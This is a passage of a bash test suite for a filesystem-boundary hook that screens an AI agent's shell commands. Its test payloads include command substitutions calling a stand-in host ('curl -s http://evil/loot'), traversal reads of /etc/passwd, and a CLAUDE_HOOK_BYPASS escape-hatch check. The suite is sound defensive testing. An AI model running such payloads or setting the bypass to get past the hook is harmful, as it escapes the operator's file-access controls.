  /usr/bin/printf 'PASS: MODEOFF-REC-01 readiness SOURCE and hook agree (doc=%s, records off=%s enforce=%s)\n' \
    "$modeoff_frag_claim" "$modeoff_off_delta" "$modeoff_enf_delta"
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: MODEOFF-REC-01 readiness SOURCE and hook DISAGREE\n  doc=%s (expected MODE-SCOPED)  behaviour=%s (expected MODE-SCOPED; off delta=%s expected 0, enforce delta=%s expected 1)\n  file=%s\n' \
    "$modeoff_frag_claim" "$modeoff_behaviour" "$modeoff_off_delta" "$modeoff_enf_delta" "$MODEOFF_FRAG"
  FAIL=$((FAIL + 1))
fi

# The GENERATED index is pinned separately rather than assumed. build-hook-registry.py
# --check already proves it matches its source, but that gate is about freshness; this one
# is about the claim, and a reader who lands on the index must not find the retired
# absolute there.
if [ "$modeoff_index_claim" = "MODE-SCOPED" ]; then
  /usr/bin/printf 'PASS: MODEOFF-REC-02 generated registry index carries the same mode-scoped claim\n'
  PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: MODEOFF-REC-02 generated index claim=%s (expected MODE-SCOPED) — regenerate with build-hook-registry.py\n  file=%s\n' \
    "$modeoff_index_claim" "$MODEOFF_INDEX"
  FAIL=$((FAIL + 1))
fi

# RED-BEFORE CONTROLS — ONE PER WAY THE CLAIM CAN GO WRONG. A classifier that cannot report
# anything but MODE-SCOPED proves nothing, so the same predicate is run against three
# mutants of the shipped document. Each arm asserts the mutation is LIVE (the mutant differs
# from the shipped file) AND that the classifier reports the specific code that mutation
# should produce — a merged conjunct, because a sed that matched nothing would otherwise let
# the control pass for the wrong reason.
modeoff_rec_control() {   # $1 = arm id  $2 = expected code  $3 = sed script
  local modeoff_mut modeoff_got
  modeoff_mut="$(/usr/bin/mktemp)"
  /usr/bin/sed "$3" "$MODEOFF_FRAG" > "$modeoff_mut"
  if /usr/bin/cmp -s "$MODEOFF_FRAG" "$modeoff_mut"; then
    /usr/bin/printf 'FAIL: %s mutation is INERT — mutant is byte-identical to the shipped document; re-point the sed\n' "$1"
    FAIL=$((FAIL + 1)); /bin/rm -f "$modeoff_mut"; return 0
  fi
  modeoff_got="$(modeoff_rec_claim "$modeoff_mut")"
  /bin/rm -f "$modeoff_mut"
  if [ "$modeoff_got" = "$2" ]; then
    /usr/bin/printf 'PASS: %s mutation is live AND the classifier reports %s (red-before control fires)\n' "$1" "$modeoff_got"
    PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s classifier did not report the drift\n  expected=%s actual=%s\n' "$1" "$2" "$modeoff_got"
    FAIL=$((FAIL + 1))
  fi
}

# (a) the F-12 regression itself — the retired absolute back in the text.
modeoff_rec_control "MODEOFF-REC-03a" "STALE-ABSOLUTE" \
  's|Admitted, and recorded on every invocation|Admitted and always recorded. Admitted, and recorded on every invocation|'
# (b) the disposition/record split silently collapsed back into one claim.
modeoff_rec_control "MODEOFF-REC-03b" "NO-SPLIT" \
  's|The disposition is mode-independent; the record is not|The disposition and the record are both mode-independent|'
# (c) the .mode=off consequence softened away — the half that makes the claim falsifiable.
modeoff_rec_control "MODEOFF-REC-03c" "NO-OFF-CLAUSE" \
  's|the hook exits before the verb check, so no advisory record is written|the hook exits before the verb check|'

# ----- AC-4 (G2): command substitution and backticks stay refused, BOTH quotings -----

test_case "AC-4 (G2): unquoted \$(...) refused" \
  "$(bash_payload 'cat $(curl -s http://evil/loot)')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): QUOTED \$(...) refused — the sentinel path" \
  "$(bash_payload 'cat "$(curl -s http://evil/loot)"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): unquoted backtick refused" \
  '{"tool_name":"Bash","tool_input":{"command":"cat `whoami`.txt"},"cwd":"/tmp"}' 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): QUOTED backtick refused" \
  '{"tool_name":"Bash","tool_input":{"command":"cat \"`whoami`.txt\""},"cwd":"/tmp"}' 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 CONTROL: a plain expansion still exits 0 in the same run — the refusals above are shape-discriminating, not a blanket re-block" \
  "$(bash_payload 'cat "$SPOKE_OUT/x"')" 0

# ----- AC-5 (G1): the guard keys on the SENTINEL, not on the brace glyph -----
#
# core/hooks/lib/command-position.awk replaces command-structural characters inside a
# QUOTED span with \001. Measured against the live canonicalizer:
#     cat "${RUN_DIR}/body.md"   ->  cat "$<1>RUN_DIR<1>/body.md"   sentinel PRESENT
#     cat ${RUN_DIR}/body.md     ->  cat ${RUN_DIR}/body.md          sentinel ABSENT
#     cat "$(curl …)"            ->  cat "$<1>curl …<1>"             sentinel PRESENT
# So on this stream a QUOTED ${VAR} is byte-identical to a QUOTED $(cmd) and must be
# refused; an UNQUOTED ${VAR} keeps its own glyphs (an unquoted $( or backtick is caught
# by G2) and is not refused by G1 — one carrying a parameter-transformation operator's
# shape is refused at G2's third limb instead, as the XFORM section below pins. RC in the Stage 5 risk register is
# the edit these three arms exist to fail: "simplify" G1 into a brace test and arm 1 or
# arm 2 breaks immediately.
#
# NOTE — DELIBERATE, SURFACED DIVERGENCE FROM THE STAGE 5 AC-5 TEXT. AC-5's parenthetical
# control arm says the unquoted form "also exits 2". That contradicts (a) the same spec's
# implementation note, which defines an expansion span as "$NAME, $1/$@/$#-class, or an
# UNQUOTED ${…}", and (b) AC-5's own stated purpose — if both quoted and unquoted braces
# refused, the guard would be keying on the brace glyph, which that sentence explicitly
# denies. Implemented to the security-correct reading. Measured: this choice moves the
# AC-1 residual by 23/5040 records (8.93% vs 9.38%) — both under the 10% threshold, so
# the threshold does not force the answer and the divergence is a security judgment.

test_case "AC-5 (G1): QUOTED \${...} refused — sentinel-bearing, indistinguishable from \$(...)" \
  "$(bash_payload 'cat "${RUN_DIR}/body.md"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-5 (G1 discriminator): UNQUOTED \${...} admitted — same brace glyph, no sentinel" \
  "$(bash_payload 'cat ${RUN_DIR}/body.md')" 0

test_case "AC-5 (G1 discriminator): quoted \$NAME with no brace admitted" \
  "$(bash_payload 'cat "$RUN_DIR/body.md"')" 0

# ----- AC-6 (G3): traversal + normalizer self-check unchanged -----

test_case "AC-6 (G3): .. inside a literal span of an expansion-bearing operand refused" \
  "$(bash_payload 'cat "$X/../../../../etc/passwd"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-6 (G3): bare relative traversal refused" \
  "$(bash_payload 'cat ../../../../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-6 CONTROL: an in-root literal read still exits 0" \
  "$(bash_payload 'cat /tmp/ok.txt')" 0

# ----- AC-7 (G4/G5): the decidable-prefix split -----
# G5's live count in the frozen population is 1, so this AC is graded almost entirely on
# synthetic arms — which is the point of asserting it. G5 refuses under -001/-002, NOT
# -003, and the message must identify the resolved path as a PREFIX: telling an operator
# a path resolved when only its prefix did is the failure mode that wording prevents.

test_case "AC-7 (G4): decidable literal prefix INSIDE an allowed root → allowed" \
  "$(bash_payload 'cat '"$HOME"'/Claude/$P/f.txt')" 0

test_case "AC-7 (G5): decidable literal prefix OUTSIDE all roots → -001, not -003" \
  "$(bash_payload 'cat /etc/$X')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "AC-7 (G5): other-user home prefix → -001, not -003" \
  "$(bash_payload 'cat /Users/otheruser/$X/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "AC-7 (G5): the -001 message identifies the resolved path as a PREFIX" \
  "$(bash_payload 'cat /etc/$X')" 2 "decidable literal prefix"

# ----- AC-8 (G0): the xargs carve-out -----
# The canonicalizer routes an xargs denial THROUGH the unresolvable branch, emitting the
# literal token `$XARGS-STDIN` (verified live: `find . -name "*.md" | xargs cat` ->
# `find . -name "*.md" | xargs ; cat $XARGS-STDIN`). A naive "leading expansion → allow"
# rule would parse that as $XARGS + literal "-STDIN", find an empty prefix, and ADMIT it —
# silently disabling the denial with no other arm noticing. G0 is ordered ahead of the
# $NAME parser for exactly this reason, and this arm is what proves the ordering holds.

test_case "AC-8 (G0): xargs-fed verb refused — the stdin sentinel is not a parameter expansion" \
  "$(bash_payload 'find . -name "*.md" | xargs cat')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-8 CONTROL: the pipe itself is not what is refused" \
  "$(bash_payload 'find . -name "*.md" | head -5')" 0

# ----- D-3: sentinel-safe message rendering -----
# The 286 sentinel-bearing operands previously emitted a raw \001 control byte to the
# operator, displaying as a corrupted path. The message now renders a readable marker.

test_case "D-3: sentinel rendered readably in the -003 message (no raw control byte)" \
  "$(bash_payload 'cat "${RUN_DIR}/body.md"')" 2 "<quoted-expansion>"

# ----- Allowed roots — should pass (exit 0) -----

test_case "cat inside Claude allowed" \
  "$(bash_payload 'cat '"$HOME"'/Claude/CLAUDE.md')" 0

test_case "cat relative inside workspace allowed (cwd is workspace)" \
  "$(bash_payload 'cat README.md' ''"$HOME"'/Claude')" 0

test_case "cp inside Claude allowed" \
  "$(bash_payload 'cp '"$HOME"'/Claude/CLAUDE.md /tmp/c.bak')" 0

test_case "cat /tmp/foo allowed" \
  "$(bash_payload 'cat /tmp/foo')" 0

test_case "cat ~/Downloads allowed (operator-confirmed root)" \
  "$(bash_payload 'cat ~/Downloads/install.dmg.txt')" 0

test_case "cat ~/.claude config allowed" \
  "$(bash_payload 'cat ~/.claude/settings.json')" 0

# NOTE: Cowork install path contains "Application Support" with a space.
# Per documented v1 limitation (whitespace-tokenization shared with
# block-rm-prefer-trash.sh), unquoted paths-with-spaces tokenize into
# `$HOME/Library/Application` (blocked) plus
# `Support/...` (orphan token, skipped). Real-world Cowork access flows
# through `./deploy.sh --deploy` which is on the script-execution allowlist;
# the internal `cp` calls happen inside the script's bash subprocess and
# the hook never sees them. Direct unquoted cat of paths-with-spaces is
# accepted v1 residual per bypass-mode-readiness.md § Known Limitations.
# The arm runs under the fixture home (HOME-FIXTURE-01), whose install path no allowlist
# row names, so it pins that the unquoted form blocks; it no longer tells the
# tokenization apart from an unlisted home.
test_case "Cowork install path quoted-form blocks (v1 limitation — unquoted whitespace path tokenizes)" \
  "$(bash_payload 'cat '"$FSB_FIXTURE_HOME"'/Library/Application Support/Claude/local-agent-mode-sessions/foo/skills/daily-status/SKILL.md')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

# ----- Verbs that are NOT in v1 scope — should pass through (out-of-scope = allow) -----

test_case "grep not in v1 scope — allowed (out of scope by design)" \
  "$(bash_payload 'grep secret ~/Documents/file.txt')" 0

test_case "find not in v1 scope — allowed" \
  "$(bash_payload 'find ~/Documents -type f')" 0

test_case "ls not in v1 scope — allowed" \
  "$(bash_payload 'ls ~/Documents')" 0

# ----- Non-Bash tool calls — early exit -----

test_case "Read tool early exit" \
  '{"tool_name": "Read", "tool_input": {"file_path": "$HOME/Documents/foo"}}' 0

test_case "Edit tool early exit" \
  '{"tool_name": "Edit", "tool_input": {"file_path": "$HOME/Desktop/foo"}}' 0

# ----- CLAUDE_HOOK_BYPASS escape hatch -----

test_case "bypass env var allows blocked cat" \
  "$(bash_payload 'cat ~/Documents/foo')" 0 "" "CLAUDE_HOOK_BYPASS=1"

test_case "bypass env var allows blocked cp" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" 0 "" "CLAUDE_HOOK_BYPASS=1"

# ----- Absolute-path-aware verb anchor -----

test_case "/bin/cat outside Claude blocks (absolute-path-aware)" \
  "$(bash_payload '/bin/cat ~/Documents/file.txt')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "/usr/bin/cp outside Claude blocks (absolute-path-aware)" \
  "$(bash_payload '/usr/bin/cp ~/Desktop/foo /tmp/bar')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

# ----- Chained-command tokenizer (F1 split) -----

test_case "ls && cat ~/Documents blocks (chained)" \
  "$(bash_payload 'ls && cat ~/Documents/foo')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "echo hi; cat ~/Desktop blocks (chained)" \
  "$(bash_payload 'echo hi; cat ~/Desktop/foo')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

# ----- Warn-mode behavior (.mode = warn → exit 0 with WARN log) -----

test_warn_case() {
  local name="$1"; local payload="$2"
  local env_var="${3:-}"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf 'warn' > "$MODE_FILE"
  if [ -n "$env_var" ]; then
    /usr/bin/printf '%s' "$payload" | /usr/bin/env "$env_var" /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  else
    /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  fi
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != 0 ] && ok=0
  if ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "WARN"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=0 with WARN in stderr)\n  stderr: %s\n' "$name" "$actual_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

test_warn_case "warn-mode cat ~/Documents emits WARN exit 0" \
  "$(bash_payload 'cat ~/Documents/foo')" "$FSB_HOME_ENV"

test_warn_case "warn-mode cp source outside emits WARN exit 0" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" "$FSB_HOME_ENV"

# ----- Off-mode behavior (.mode = off → exit 0 silently) -----

test_off_case() {
  local name="$1"; local payload="$2"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf 'off' > "$MODE_FILE"
  /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  /bin/rm -f "$tmp_stderr"
  if [ "$actual_exit" = 0 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=0)\n' "$name" "$actual_exit"
    FAIL=$((FAIL + 1))
  fi
}

test_off_case "off-mode cat ~/Documents silently allowed" \
  "$(bash_payload 'cat ~/Documents/foo')"

# ----- Empty/no-target commands — allow -----

test_case "bare cat with no args allowed" \
  "$(bash_payload 'cat')" 0

test_case "cat with all flags (no targets) allowed" \
  "$(bash_payload 'cat -n')" 0

# ----- Missing-jq dependency gate (GHSA-9cjm-v22x-4x33 regression) -----
# jq resolution now lives in the shared helper lib/dep-resolve.sh, so simulating
# missing jq requires sandboxing BOTH files: a copy of the hook plus a copy of
# the helper with all three jq candidate paths rewritten to nonexistent
# locations. This hook is mode-gated: a control that cannot parse its input must
# DENY in enforce mode (exit 2) and DEGRADE (exit 0, never block harder than a
# rule match) in warn mode.
_sb="$(/usr/bin/mktemp -d)"
/bin/mkdir -p "$_sb/lib"
/bin/cp "$HOOK" "$_sb/block-fs-boundary.sh"; /bin/chmod +x "$_sb/block-fs-boundary.sh"
/usr/bin/sed \
  -e 's#/usr/bin/jq#/nonexistent/jq-a#g' \
  -e 's#/opt/homebrew/bin/jq#/nonexistent/jq-b#g' \
  -e 's#/usr/local/bin/jq#/nonexistent/jq-c#g' \
  "${HOOK_DIR}/lib/dep-resolve.sh" > "$_sb/lib/dep-resolve.sh"
_sb_hook="$_sb/block-fs-boundary.sh"
_sb_payload='{"tool_name":"Bash","tool_input":{"command":"cat /tmp/foo"},"cwd":"/tmp"}'

# enforce mode → fail CLOSED (exit 2 + DEPENDENCY-MISSING)
/usr/bin/printf 'enforce' > "$_sb/.mode"
_jqmiss_exit=0
_jqmiss_err="$(/usr/bin/printf '%s' "$_sb_payload" | /bin/bash "$_sb_hook" 2>&1 >/dev/null)" || _jqmiss_exit="$?"
if [ "$_jqmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_jqmiss_err" | /usr/bin/grep -qE 'DEPENDENCY-MISSING'; then
  /usr/bin/printf 'PASS: jq missing (enforce) → fail CLOSED (exit 2 + DEPENDENCY-MISSING)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: jq missing (enforce) → expected exit 2 + DEPENDENCY-MISSING, got exit=%s\n  stderr: %s\n' "$_jqmiss_exit" "$_jqmiss_err"; FAIL=$((FAIL + 1))
fi

# warn mode → DEGRADE (exit 0 + DEPENDENCY-DEGRADED); must not block harder than a match
/usr/bin/printf 'warn' > "$_sb/.mode"
_jqwarn_exit=0
_jqwarn_err="$(/usr/bin/printf '%s' "$_sb_payload" | /bin/bash "$_sb_hook" 2>&1 >/dev/null)" || _jqwarn_exit="$?"
if [ "$_jqwarn_exit" = 0 ] && /usr/bin/printf '%s' "$_jqwarn_err" | /usr/bin/grep -qE 'DEPENDENCY-DEGRADED'; then
  /usr/bin/printf 'PASS: jq missing (warn) → degrade (exit 0 + DEPENDENCY-DEGRADED)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: jq missing (warn) → expected exit 0 + DEPENDENCY-DEGRADED, got exit=%s\n  stderr: %s\n' "$_jqwarn_exit" "$_jqwarn_err"; FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$_sb"

# ----- Missing dependency helper → fail CLOSED (GHSA-9cjm-v22x-4x33) -----
# If lib/dep-resolve.sh is unreadable, bash 3.2 exits 1 on the failed source
# (non-blocking) — the readability guard converts that to a blocking exit 2.
_sb2="$(/usr/bin/mktemp -d)"
/bin/cp "$HOOK" "$_sb2/block-fs-boundary.sh"; /bin/chmod +x "$_sb2/block-fs-boundary.sh"
/usr/bin/printf 'enforce' > "$_sb2/.mode"   # no $_sb2/lib/dep-resolve.sh created
_libmiss_exit=0
_libmiss_err="$(/usr/bin/printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /tmp/foo"},"cwd":"/tmp"}' | /bin/bash "$_sb2/block-fs-boundary.sh" 2>&1 >/dev/null)" || _libmiss_exit="$?"
/bin/rm -rf "$_sb2"
if [ "$_libmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_libmiss_err" | /usr/bin/grep -qE 'LIB-MISSING'; then
  /usr/bin/printf 'PASS: dep helper missing → fail CLOSED (exit 2 + LIB-MISSING)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: dep helper missing → expected exit 2 + LIB-MISSING, got exit=%s\n  stderr: %s\n' "$_libmiss_exit" "$_libmiss_err"; FAIL=$((FAIL + 1))
fi

# ==========================================================================
# XFORM — the parameter-transformation operator: REFUSED at G2 by its shape
# ==========================================================================
# On a shell that implements it, `${VAR@P}` re-expands the variable's VALUE as a prompt
# string, which performs command substitution. G2 refuses the operator by its SHAPE (a
# `${` and, anywhere, `@`, one character other than `]` or `}`, then `}`), because the
# operand's path is whatever an evaluation produces. These arms pin that refusal, its
# over-refusal, the positions the walk never hands over, the forms G2 cannot see, the two
# forms the span split refuses, and an operator use the token walk splits inside a
# subscript that holds a braced expansion, which the span split refuses (XFORM-FRAG).
#
# Every verdict the HOOK gives in this section is LEXICAL: the hook never executes a
# payload, so the hook arms are evaluable on any host. Two arms assert shell behaviour
# instead: XFORM-RESID-04 observes three value forms run on /bin/bash, and XFORM-SEM-01
# demonstrates that the operator EXECUTES, reporting NOT-EVALUATED — never a pass — on an
# interpreter that rejects it.
#
# A PIN SAYS WHICH VERDICT IT PINS. Forty-four pins: SUBJ 3, PFX 2, OP/PARAM/NEST 4,
# POS 4, RESID 3, OVER 11, SPLIT 2, FRAG 15. Each asserts the exit code AND either the
# number of -004 records the call wrote or the rule its refusal names, because one exit
# code can come from different guards: G2 and the span split refuse under -003, G6 admits
# with a record, G4 admits silently, a word the token walk never hands to the cascade
# writes nothing, G1 refuses under -003 and G5, for a read verb, under -001. The nine near
# misses assert only that they are admitted.
#
# EVERY PIN IS PAIRED, ON EVERY DIMENSION IT ASSERTS. A pin is green on the shipped hook
# by construction, so for each dimension it asserts a pairing arm runs the pin's OWN
# predicate through a sandbox copy of the hook mutated for that dimension, and passes only
# when that predicate FAILS there and the copy gives the verdict its mutation produces.
# Every copy is shape-guarded (XFORM-MUT-SHAPE-*): exactly the lines it takes out and puts
# in against the shipped hook, it parses, it still refuses an untouched out-of-root
# literal under -001, and it still admits an untouched in-root one — so a pin fails there
# because of the mutation, not because the copy is dead.
#   R    G6 refuses (return 3 -> return 2)                  exit dimension of every G6 admit
#   S    G6 writes no record (its advise call -> :)        record dimension of every G6 admit
#   G1A  G1 admits (return 2 -> return 3)                   exit dimension of the G1 refusal
#   G1O  G1 refuses as outside (return 2 -> return 1)       rule dimension of the G1 refusal
#   T    G2's third limb removed (its call line -> :)       exit dimension of every G2 refusal
#   TO   G2's third limb refuses as outside (return 1)      rule dimension of every G2 refusal
#   TG5A T, and G5 admits                                   exit dimension of XFORM-PFX-02
#   F    the walk hands a flag-position word to the cascade  exit dimension of XFORM-POS-01
#   FT   F, and T                                            record dimension of XFORM-POS-01
#   W    the walk hands every word of every segment over     exit dimension of XFORM-POS-02
#   WT   W, and T                                            record dimension of XFORM-POS-02
#   A    the walk keeps a redirection's & in the segment    exit dimension of XFORM-POS-03
#   AT   A, and T                                            record dimension of XFORM-POS-03
#   L    the walk joins a continuation line to its line     exit dimension of XFORM-POS-04
#   LT   L, and T                                            record dimension of XFORM-POS-04
#   U    the span split takes an unterminated ${ as a span   exit dimension of SPLIT and FRAG-15
#   UO   the span split's failure is refused as outside      rule dimension of SPLIT, FRAG and OVER-05/06/08/09/10
#   K    the span split takes a span closed inside a subscript (its check -> :)
#                                                            exit dimension of every split-subscript
#                                                            refusal; rule dimension of FRAG-14, OVER-07
#   KG5A K, and G5 admits                                   exit dimension of FRAG-14 and OVER-07
# The document arms XFORM-DOC-01 and -02 are paired on both halves: the document half by
# the XFORM-DOC-03 mutants, the hook half by XFORM-MUT-01. XFORM-RESID-04 and XFORM-SEM-01
# assert shell behaviour rather than hook behaviour; their own control (a direct
# substitution runs) and near miss (a plain brace form does not) are their pairing.
#
# NO PIPELINES ANYWHERE IN THIS BLOCK, for the reason MODEOFF-REC gives above: every
# payload reaches a hook from a FILE, and every count is one awk pass over a file.
echo ""
echo "the parameter-transformation operator — refused at G2 and at the span split (XFORM-*)"
echo "---"

XFORM_NL='
'

# xform_rec_count <warn log> -> integer count of the -004 records in it. One awk pass with
# index(), as modeoff_rec_count above, so a zero is a reading and not an exit status.
xform_rec_count() {
  if [ ! -f "$1" ]; then /usr/bin/printf '0'; return 0; fi
  /usr/bin/awk 'index($0, "BLOCK-FS-BOUNDARY-004") { n++ } END { printf "%d", n + 0 }' "$1"
}

# xform_observe <hook dir> <command> — one call of <hook dir>/block-fs-boundary.sh at that
# directory's .mode, the payload fed from a FILE. Sets XO_EXIT (its exit code), XO_REC (the
# -004 records the call wrote to that directory's own warn log) and XO_ERR (its stderr).
XO_EXIT=0
XO_REC=0
XO_ERR=""
xform_observe() {
  local xo_dir="$1" xo_pf xo_ef xo_before xo_after
  xo_pf="$(/usr/bin/mktemp)"
  xo_ef="$(/usr/bin/mktemp)"
  /usr/bin/printf '%s' "$(bash_payload "$2")" > "$xo_pf"
  xo_before="$(xform_rec_count "${xo_dir}/fs-boundary-warn-log.jsonl")"
  XO_EXIT=0
  /bin/bash "${xo_dir}/block-fs-boundary.sh" < "$xo_pf" > /dev/null 2> "$xo_ef" || XO_EXIT="$?"
  xo_after="$(xform_rec_count "${xo_dir}/fs-boundary-warn-log.jsonl")"
  XO_REC=$((xo_after - xo_before))
  XO_ERR="$(/bin/cat "$xo_ef")"
  /bin/rm -f "$xo_pf" "$xo_ef"
}

# xform_holds <hook dir> <command> <exit> <kind> [<want>] — the ONE predicate a pin and its
# pairing arms share. 0 when the hook in <hook dir> gives <exit> and, by <kind>:
#   rec    exactly <want> -004 records written by the call
#   rule   stderr names the rule <want>
#   none   nothing further
# The XO_* values it leaves are the verdict of the one call it made.
xform_holds() {
  xform_observe "$1" "$2"
  [ "$XO_EXIT" = "$3" ] || return 1
  case "$4" in
    rec)  [ "$XO_REC" = "${5:-}" ] ;;
    rule) case "$XO_ERR" in *"${5:-no-rule-named}"*) return 0 ;; *) return 1 ;; esac ;;
    none) return 0 ;;
    *)    return 1 ;;
  esac
}

# xform_pin <label> <command> <exit> <kind> [<want>] — a pin: the SHIPPED hook holds it.
xform_pin() {
  if xform_holds "$HOOK_DIR" "$2" "$3" "$4" "${5:-}"; then
    /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=%s; -004 records written=%s; want %s %s)\n  stderr: %s\n' \
      "$1" "$XO_EXIT" "$3" "$XO_REC" "$4" "${5:-}" "$XO_ERR"
    FAIL=$((FAIL + 1))
  fi
}

# xform_pair <label> <copy> <command> <exit> <kind> <want> <copy exit> <copy records> <copy rule>
#   The pin's own predicate (<exit> <kind> <want>), run through the copy in <copy>, must
#   FAIL; and that copy must give <copy exit> with <copy records> -004 records, naming
#   <copy rule> on stderr unless it is `-` — the verdict its mutation produces, so the pin
#   is red there for that reason and no other.
xform_pair() {
  local xp_ok=1 xp_why=""
  if xform_holds "$2" "$3" "$4" "$5" "$6"; then
    xp_ok=0; xp_why="${xp_why} the pin still HOLDS through this copy, so it cannot go red here;"
  fi
  if [ "$XO_EXIT" != "$7" ]; then xp_ok=0; xp_why="${xp_why} copy exit=${XO_EXIT}, want ${7};"; fi
  if [ "$XO_REC" != "$8" ]; then xp_ok=0; xp_why="${xp_why} copy records=${XO_REC}, want ${8};"; fi
  if [ "$9" != "-" ]; then
    case "$XO_ERR" in
      *"$9"*) : ;;
      *) xp_ok=0; xp_why="${xp_why} copy stderr does not name ${9};" ;;
    esac
  fi
  if [ "$xp_ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s —%s\n  stderr: %s\n' "$1" "$xp_why" "$XO_ERR"
    FAIL=$((FAIL + 1))
  fi
}

# xform_copy <name> <sed edit>... — <base>/<name>/hooks/block-fs-boundary.sh: the shipped
# hook with each edit applied in turn, beside a copy of its lib/, the allowlist and a .mode
# of enforce, so it resolves as the shipped hook does and writes its own warn log. Prints
# the copy's hook directory.
XFORM_BASE="$(/usr/bin/mktemp -d)"
xform_copy() {
  local xc_dir="${XFORM_BASE}/${1}/hooks" xc_edit
  shift
  /bin/mkdir -p "$xc_dir"
  /bin/cp -R "${HOOK_DIR}/lib" "${xc_dir}/lib"
  /bin/cp "${HOOK_DIR}/../fs-boundary-allowlist.txt" "${xc_dir}/../fs-boundary-allowlist.txt"
  /bin/cp "$HOOK" "${xc_dir}/block-fs-boundary.sh"
  for xc_edit in "$@"; do
    /usr/bin/sed -e "$xc_edit" "${xc_dir}/block-fs-boundary.sh" > "${xc_dir}/next.sh"
    /bin/mv "${xc_dir}/next.sh" "${xc_dir}/block-fs-boundary.sh"
  done
  /bin/chmod +x "${xc_dir}/block-fs-boundary.sh"
  /usr/bin/printf 'enforce' > "${xc_dir}/.mode"
  /usr/bin/printf '%s' "$xc_dir"
}

# The edits. Each names the one line it changes, and each such line occurs exactly once in
# the hook; the shape guards below fail the moment one stops matching.
XFORM_X_R='s/^  return 3$/  return 2/'
# shellcheck disable=SC2016  # a sed program, not an expansion
XFORM_X_S='s/^        advise_unresolvable "\$verb" "\$token"$/        :/'
# shellcheck disable=SC2016
XFORM_X_G1A='s/^\(    \*"\$CMDPOS_SENTINEL"\*) \)return 2;;$/\1return 3;;/'
# shellcheck disable=SC2016
XFORM_X_G1O='s/^\(    \*"\$CMDPOS_SENTINEL"\*) \)return 2;;$/\1return 1;;/'
XFORM_X_G5A='s/; return 4;;$/; return 0;;/'
XFORM_X_F='s/^          if (substr(t, 1, 1) == "-") continue;$/          t = t;/'
XFORM_X_W1='s/^        if (first_token != v) continue;$/        first_token = v;/'
XFORM_X_W2='s/^        for (i = first + 1; i <= m; i++) {$/        for (i = first; i <= m; i++) {/'
# A and L both change the walk's split line, each in a copy of its own. The walk ends a
# segment at every `&` and the canonicalizer starts a command after one, so A takes a
# redirection's `&` and the separator after it out of the record before the split, and the
# verb's segment runs on past the redirection. The walk reads one physical line per awk
# record, so L joins a line that ends in a backslash to the line after it before the split,
# as the shell does.
# shellcheck disable=SC2016
XFORM_X_A='s#^      n = split(\$0, segments, /\[;&|\]+/);$#      gsub(/[<>]\&; /, ">"); n = split($0, segments, /[;\&|]+/);#'
# shellcheck disable=SC2016
XFORM_X_L='s#^      n = split(\$0, segments, /\[;&|\]+/);$#      while ($0 ~ /\\\\$/ \&\& (getline nx) > 0) $0 = substr($0, 1, length($0) - 1) " " nx; n = split($0, segments, /[;\&|]+/);#'
# T removes G2's third limb and TO makes it refuse as outside; U lets the span split take an
# unterminated ${ as one span and UO makes its failure refuse as outside; K removes the span
# split's subscript check. Each call line they key on occurs exactly once in the hook.
# shellcheck disable=SC2016
XFORM_X_T='s/^  if _carries_transform_op "\$token"; then return 2; fi$/  :/'
# shellcheck disable=SC2016
XFORM_X_TO='s/^  if _carries_transform_op "\$token"; then return 2; fi$/  if _carries_transform_op "$token"; then return 1; fi/'
# shellcheck disable=SC2016
XFORM_X_U='s/^          \*)    return 1;;$/          *)    consumed="\\$${after}";;/'
# shellcheck disable=SC2016
